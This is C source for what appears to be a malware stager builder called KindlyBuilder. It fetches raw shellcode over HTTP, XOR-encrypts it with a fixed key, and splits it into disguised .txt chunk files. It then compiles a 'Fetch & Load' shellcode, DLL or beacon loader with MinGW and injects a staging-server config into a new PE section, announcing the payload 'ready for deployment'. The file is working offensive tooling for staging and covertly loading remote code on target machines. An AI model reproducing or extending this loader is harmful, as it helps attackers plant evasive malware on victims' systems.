#include <stdio.h>
#include <windows.h>
#include "Core/Include/Http.h"
#include "Core/Include/Cmd.h"
#include "Core/Include/Pe.h"
#include "Core/Include/Banner.h"
#include "KindlyBuilder.h"

#include "Core/Include/Utils.h"

// TODO Move to Crytpo.c file
BOOL EncryptXOR(IN OUT PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN BYTE bKey) { // Move to file with different algorithms
    for (size_t i = 0; i < sShellcodeSize; i++){
        pShellcode[i] = pShellcode[i] ^ bKey;
    }
    return TRUE;
}

BUILDER myBuilder = { 0 };

PBUILDER Builder = &myBuilder;


/* Takes in Shellcode .bin file, Encrypts, and seperates into chunks */
// TODO Remove ChunkSize from global config and save here. Won't need it if we're keeping PayloadSize & ChunkCount as global variables.
BOOL BuildPayload() {
    PVOID           pRawPayloadBuffer           = NULL;
    DWORD           dwPayloadSize               = 0;
    DWORD           dwBytesCounted              = 0;
    DWORD           dwTotalBytesWritten         = 0;
    WCHAR           wcDrive[MAX_PATH];
    WCHAR           wcDir[MAX_PATH];
    WCHAR           wcFilename[MAX_PATH];
    WCHAR           wcExt[MAX_PATH];
    WCHAR           wcOutputDirectory[MAX_PATH];

    HttpDownloadPayload(Builder->PayloadSize, &pRawPayloadBuffer, &dwPayloadSize);

    // TODO Have option to read beginning->end of payload or end->beginning of payload.
    // TODO If dwChunkSize is not full number than round up or down (this option will be added in command line to round up or down chunks)
    Builder->ChunkSize = Builder->PayloadSize / Builder->ChunkCount;

    printf("[+] Chunk Size: %lu\n", Builder->ChunkSize);

    _wsplitpath(Builder->PayloadOutputDirectory, wcDrive, wcDir, wcFilename, wcExt);
    _swprintf(wcOutputDirectory, L"%ls%ls", wcDrive, wcDir);

    for (int i = 0; i <= Builder->ChunkCount - 1; i++) {
         // All file creations and memory allocations will be in here
        PVOID pSubBuffer = pRawPayloadBuffer + (i* Builder->ChunkSize);
        PBYTE pTempBuffer = LocalAlloc(LMEM_ZEROINIT, Builder->ChunkSize);
        memcpy(pTempBuffer, pSubBuffer, Builder->ChunkSize);
        dwBytesCounted += Builder->ChunkSize; // Will be dwBytesRead or something like that to verify
        WCHAR filename[MAX_PATH];
        swprintf(filename, sizeof(filename) / sizeof(WCHAR), L"%ls%d.txt", wcOutputDirectory, i);
        HANDLE hFile = CreateFileW(filename, GENERIC_ALL, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
        printf("[+] Chunk %d Filename %ls\n", i, filename);

        // Encrypt

        EncryptXOR(pTempBuffer, Builder->ChunkSize, Builder->EncryptionKey);
        DWORD dwBytesWritten = 0;
        WriteFile(hFile, pTempBuffer, Builder->ChunkSize, &dwBytesWritten, NULL);
        dwTotalBytesWritten += dwBytesWritten;
        free(pTempBuffer);
    }
    printf("[+] Total Bytes Read: %lu\n[+] Total Bytes Written: %lu\n", dwBytesCounted, dwTotalBytesWritten);
    return TRUE;
}

/* Compiles Payload with Mingw */
// TODO make this rely on relative directory
BOOL Compile() {
    WCHAR wcCurrentPath[MAX_PATH];
    DWORD dwPathSize = GetCurrentDirectoryW(MAX_PATH, wcCurrentPath);

    WCHAR command[2048];
    if (Builder->PayloadOutputDirectory == NULL) {
        Builder->PayloadOutputDirectory = malloc(MAX_PATH);
        _swprintf(Builder->PayloadOutputDirectory, L"%s\\..\\beacon.exe", wcCurrentPath);
    }
    // TODO if DllPayload : Compile for DLL if ShellCode Compile for Shellcode
    if (Builder->PayloadType == PAYLOAD_SHELLCODE) {
        _swprintf(command, L"x86_64-w64-mingw32-gcc.exe %ls\\..\\..\\KindlyPayload\\Payloads\\Shellcode.c  %ls\\..\\..\\KindlyPayload\\Payloads\\Common\\Common.c %ls\\..\\..\\KindlyPayload\\Core\\Src\\*.c %ls\\..\\..\\KindlyPayload\\Lib\\cJSON\\*.c -I%ls\\..\\..\\KindlyPayload\\Core\\Include\\ -I%ls\\..\\..\\KindlyPayload\\Lib\\cJSON\\ -I%ls\\..\\..\\KindlyPayload\\Payloads\\Common\\ -lwininet -o %ls", wcCurrentPath, wcCurrentPath, wcCurrentPath, wcCurrentPath, wcCurrentPath, wcCurrentPath, wcCurrentPath , Builder->PayloadOutputDirectory);
        _wsystem(command);
        printf("[+] Compiled Payload Successfully (Payload Type: Fetch & Load Shellcode)\n");
    } else if (Builder->PayloadType == PAYLOAD_DLL) {
        _swprintf(command, L"x86_64-w64-mingw32-gcc.exe %ls\\..\\..\\KindlyPayload\\Payloads\\Dll.c  %ls\\..\\..\\KindlyPayload\\Payloads\\Common\\Common.c %ls\\..\\..\\KindlyPayload\\Core\\Src\\*.c %ls\\..\\..\\KindlyPayload\\Lib\\cJSON\\*.c  %ls\\..\\..\\KindlyPayload\\Lib\\DLLMemLdr\\*.c -I%ls\\..\\..\\KindlyPayload\\Core\\Include\\ -I%ls\\..\\..\\KindlyPayload\\Lib\\cJSON\\ -I%ls\\..\\..\\KindlyPayload\\Lib\\DLLMemLdr\\ -I%ls\\..\\..\\KindlyPayload\\Payloads\\Common\\  -lwininet -o %ls", wcCurrentPath, wcCurrentPath, wcCurrentPath, wcCurrentPath, wcCurrentPath, wcCurrentPath, wcCurrentPath, wcCurrentPath, wcCurrentPath, Builder->PayloadOutputDirectory);
        _wsystem(command);
        printf("[+] Compiled Payload Successfully (Payload Type: Fetch & Load DLL)\n");
    } else if (Builder->PayloadType == PAYLOAD_BEACON) {
        _swprintf(command, L"x86_64-w64-mingw32-gcc.exe %ls\\..\\..\\KindlyPayload\\Payloads\\Dll.c  %ls\\..\\..\\KindlyPayload\\Payloads\\Common\\Common.c %ls\\..\\..\\KindlyPayload\\Core\\Src\\*.c %ls\\..\\..\\KindlyPayload\\Lib\\cJSON\\*.c  %ls\\..\\..\\KindlyPayload\\Lib\\DLLMemLdr\\*.c -I%ls\\..\\..\\KindlyPayload\\Core\\Include\\ -I%ls\\..\\..\\KindlyPayload\\Lib\\cJSON\\ -I%ls\\..\\..\\KindlyPayload\\Lib\\DLLMemLdr\\ -I%ls\\..\\..\\KindlyPayload\\Payloads\\Common\\  -lwininet -o %ls", wcCurrentPath, wcCurrentPath, wcCurrentPath, wcCurrentPath, wcCurrentPath, wcCurrentPath, wcCurrentPath, wcCurrentPath, wcCurrentPath, Builder->PayloadOutputDirectory);
        _wsystem(command);
        printf("[+] Compiled Payload Successfully (Payload Type: Fetch & Load DLL)\n");
    }
    return TRUE;
}

// TODO Create error handling for arguments passed and others.

int main(int argc, char *argv[])
{
    Builder->EncryptionMethod           = ENCRYPTION_UNKNOWN;
    Builder->PayloadType                = PAYLOAD_UNKNOWN;
    Builder->PayloadOutputDirectory     = NULL;
    Builder->RemotePayloadURL           = NULL;
    Builder->StagingURL                 = NULL;
    Builder->PayloadSize                = 0;
    Builder->ChunkCount                 = 0;
    Builder->EncryptionKey              = 0x51; // TODO change this so that it's passed through command line.

    if (!HandleArgs(argc, argv)) {
        printf("Handle Args Failed");
        return 0;
    }
    PrintBanner();
    printf("[+] Fetching Remote Payload %ls\n", Builder->RemotePayloadURL);
    printf("[+] Payload Size %lu\n", Builder->PayloadSize);
    printf("[+] Using Encryption Method %d\n", Builder->EncryptionMethod);
    printf("[+] Setting Staging Server to %ls\n", Builder->StagingURL);
    printf("[+] Chunk (file) Count %lu\n", Builder->ChunkCount);
    printf("[+] Output Directory %ls\n", Builder->PayloadOutputDirectory);

    BuildPayload();

    CHAR cJsonData[1024];
    sprintf(cJsonData, "{\"1\": \"%lu\", \"2\": \"%c\", \"3\": \"%ls\", \"4\": \"%lu\", \"5\": \"%d\"}\0", Builder->PayloadSize, Builder->EncryptionKey, Builder->StagingURL, Builder->ChunkCount, Builder->isBeacon);
    printf("[+] Built Payload Config: %s\n", cJsonData);
    Compile();
    printf("[+] Compiled Payload %ls\n", Builder->PayloadOutputDirectory);

    AddPESection(Builder->PayloadOutputDirectory);
    printf("[+] Injecting Section to l%ls (.TEST)\n", Builder->PayloadOutputDirectory);
    AddDataToSection(Builder->PayloadOutputDirectory, cJsonData);
    printf("[+] Config Injected to PE Section Successfully");
    printf("[+] Payload ready for deployment! \n[+] Make sure to transfer chunk files to remote host %ls \n", Builder->RemotePayloadURL);
    return 0;
}
